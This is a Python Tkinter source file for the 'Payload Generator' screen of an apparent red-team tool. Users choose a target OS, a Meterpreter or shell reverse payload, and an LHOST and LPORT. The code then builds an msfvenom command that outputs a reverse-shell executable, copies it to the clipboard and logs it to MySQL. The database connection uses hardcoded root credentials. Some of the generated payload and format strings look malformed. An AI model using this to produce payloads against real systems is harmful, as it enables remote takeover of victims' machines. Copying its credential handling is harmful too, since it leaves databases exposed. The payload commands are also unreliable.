import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import mysql.connector as sqltor
import pyperclip
import os

db = sqltor.connect(
    host="localhost",
    user="root",
    password="tiger",
    database="rttm"
)
cur = db.cursor()
def open_payload_generator(dashboard):

    pg = tk.Toplevel()
    pg.title("Payload Generator")
    pg.state("zoomed")
    pg.configure(bg="#0f0f0f")

    pg.columnconfigure(0, weight=1)
    pg.columnconfigure(1, weight=1)
    pg.columnconfigure(2, weight=1)
    pg.rowconfigure(6, weight=1)

    def back():
        pg.destroy()
        dashboard.deiconify()

    tk.Button(
        pg, text="← Back", command=back,
        bg="#00ff88", fg="black",
        font=("Segoe UI", 12, "bold")
    ).grid(row=0, column=2, sticky="e", padx=25, pady=20)

    tk.Label(
        pg, text="Payload Generator",
        font=("Segoe UI", 28, "bold"),
        fg="#00ff88", bg="#0f0f0f"
    ).grid(row=0, column=0, columnspan=2, pady=10)

    form = tk.Frame(pg, bg="#0f0f0f")
    form.grid(row=1, column=0, columnspan=3, pady=20)

    for i in range(3):
        form.columnconfigure(i, weight=1)

    tk.Label(form, text="Select OS:", fg="#00ff88", bg="#0f0f0f",
             font=("Segoe UI", 12)).grid(row=0, column=0, pady=10)

    os_var = ttk.Combobox(form, values=["Windows", "Linux", "Android", "MacOS"], width=40)
    os_var.grid(row=0, column=1, pady=10)

    tk.Label(form, text="Payload Type:", fg="#00ff88", bg="#0f0f0f",
             font=("Segoe UI", 12)).grid(row=1, column=0, pady=10)

    payload_var = ttk.Combobox(form, values=[
        "meterpreter/reverse_tcp",
        "meterpreter/reverse_http",
        "shell/reverse_tcp"
    ], width=40)
    payload_var.grid(row=1, column=1, pady=10)

    tk.Label(form, text="LHOST:", fg="#00ff88", bg="#0f0f0f",
             font=("Segoe UI", 12)).grid(row=2, column=0, pady=10)

    lhost_entry = tk.Entry(form, width=42, bg="#1c1c1c", fg="#00ff88")
    lhost_entry.grid(row=2, column=1, pady=10)

    tk.Label(form, text="LPORT:", fg="#00ff88", bg="#0f0f0f",
             font=("Segoe UI", 12)).grid(row=3, column=0, pady=10)

    lport_entry = tk.Entry(form, width=42, bg="#1c1c1c", fg="#00ff88")
    lport_entry.grid(row=3, column=1, pady=10)

    tk.Label(form, text="Output File (optional):", fg="#00ff88",
             bg="#0f0f0f", font=("Segoe UI", 12)).grid(row=4, column=0, pady=10)

    output_entry = tk.Entry(form, width=42, bg="#1c1c1c", fg="#00ff88")
    output_entry.grid(row=4, column=1, pady=10)

    def browse_file():
        path = filedialog.asksaveasfilename(
            defaultextension=".exe",
            filetypes=[("All files", "*.*")]
        )
        if path:
            output_entry.delete(0, tk.END)
            output_entry.insert(0, path)

    tk.Button(form, text="Browse", command=browse_file,
              bg="#00ff88", fg="black",
              width=10).grid(row=4, column=2, padx=10)

    cmd_frame = tk.Frame(pg, bg="#0f0f0f")
    cmd_frame.grid(row=6, column=0, columnspan=3,
                   sticky="nsew", padx=40, pady=10)

    cmd_frame.columnconfigure(0, weight=1)
    cmd_frame.rowconfigure(0, weight=1)

    cmd_box = tk.Text(
        cmd_frame, height=8,
        bg="#1c1c1c", fg="#00ff88",
        font=("Consolas", 12), wrap="word"
    )
    cmd_box.grid(row=0, column=0, sticky="nsew")

    scrollbar = tk.Scrollbar(cmd_frame, command=cmd_box.yview)
    scrollbar.grid(row=0, column=1, sticky="ns")
    cmd_box.config(yscrollcommand=scrollbar.set)

    def generate_command():
        os_val = os_var.get()
        payload = payload_var.get()
        lhost = lhost_entry.get()
        lport = lport_entry.get()
        outfile = output_entry.get()

        if not os_val or not payload or not lhost or not lport:
            messagebox.showerror("Error", "All fields except Output File are required.")
            return

        ext = {
            "Windows": "exe",
            "Linux": "elf",
            "Android": "apk",
            "MacOS": "macho"
        }

        if outfile == "":
            outfile = f"payload.{ext[os_val]}"

        msf_cmd = f"msfvenom -p {os_val.lower()}/{payload} LHOST={lhost} LPORT={lport} -f {ext[os_val]} -o {outfile}"

        cmd_box.delete("1.0", tk.END)
        cmd_box.insert(tk.END, msf_cmd)

        cur.execute("""
            INSERT INTO payloads(os, payload_type, lhost, lport, output_file, command)
            VALUES (%s, %s, %s, %s, %s, %s)
        """, (os_val, payload, lhost, lport, outfile, msf_cmd))
        db.commit()

        messagebox.showinfo("Success", "Payload command generated and saved.")

    tk.Button(
        pg, text="Generate Payload", command=generate_command,
        bg="#00ff88", fg="black",
        font=("Segoe UI", 12, "bold"), width=20
    ).grid(row=5, column=0, pady=20)

    def copy_cmd():
        pyperclip.copy(cmd_box.get("1.0", tk.END))
        messagebox.showinfo("Copied", "Command copied to clipboard!")

    tk.Button(
        pg, text="Copy Command", command=copy_cmd,
        bg="#00ff88", fg="black",
        font=("Segoe UI", 12), width=20
    ).grid(row=5, column=2, pady=20)
